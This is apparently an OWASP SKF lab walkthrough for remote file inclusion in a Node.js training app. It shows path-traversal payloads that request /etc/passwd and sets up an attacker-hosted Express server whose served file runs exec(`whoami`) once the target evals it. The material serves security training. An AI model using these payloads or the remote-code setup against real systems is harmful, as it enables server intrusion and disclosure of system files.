# KBID 173 - Remote File Inclusion

## Running the app nodeJs

First make sure nodejs and npm are installed on your host machine.
After installation, we go to the folder of the lab we want to practice.
"i.e /skf-labs/XSS, /skf-labs/RFI/" and run the following commands:

```
$ npm install
```

```
$ npm start
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

Remote File Inclusion (also known as RFI) is the process of including files, that are supplied into the application and loaded from an external (remote) source, through the exploiting of vulnerable inclusion procedures implemented in the application. This vulnerability occurs, for example, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Although most examples point to vulnerable PHP scripts, we should keep in mind that it is also common in other technologies such as JSP, ASP and others.

Warning: To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting /etc/passwd from an IIS web server.

Some Examples:

```text
http://example.com/getUserProfile.jsp?item=../../../../etc/passwd

Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd
```

## Exploitation

The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:

Code execution on the web server

Code execution on the client-side such as JavaScript

which can lead to other attacks such as:

Cross-site scripting (XSS)

Denial of Service (DoS)

Sensitive Information Disclosure

Let us see how can we exploit the file inclusion vulnerability in a real world scenario, the application here allows us to run 2 commands from the drop down list. One is running Date and the other is Calendar.

![](../../.gitbook/assets/nodejs/RFI/1.png)

![](../../.gitbook/assets/nodejs/RFI/2.png)

When we will have a look in our intercepting proxy we can see that the application uses a predefined file that contains the command to execute and prints the results of it.

![](../../.gitbook/assets/nodejs/RFI/3.png)

Creating your own webserver: In this case you can use nodeJs express to create a small webserver that serves your file. We name it evil_server.js

```javascript
const express = require("express");
const app = express();

app.use(express.static(__dirname + "/static"));
app.use(express.urlencoded({ extended: true }));

app.get("", (req, res) => {
  res.sendFile(__dirname + "/evil.txt");
});

const port = process.env.PORT || 1337;

app.listen(port, () => console.log(`Listening on port ${port}...!!!`));
```

Install dependencies:

```
$ npm install express
```

Then we create a file evil.txt and put the content below

```javascript
exec(`whoami`);
```

Now we are ready to start our evil_server.py and try to make the application load our evil file and hopefully it will get executed.

```
$ node evil_server.js
```

Our remote file inclusion worked and the application seems to load javascript files and eval() the content of them.

![](../../.gitbook/assets/nodejs/RFI/4.png)

Success! As we observed, we can include our own files through RFI.

## Additional sources

{% embed url="https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion" %}
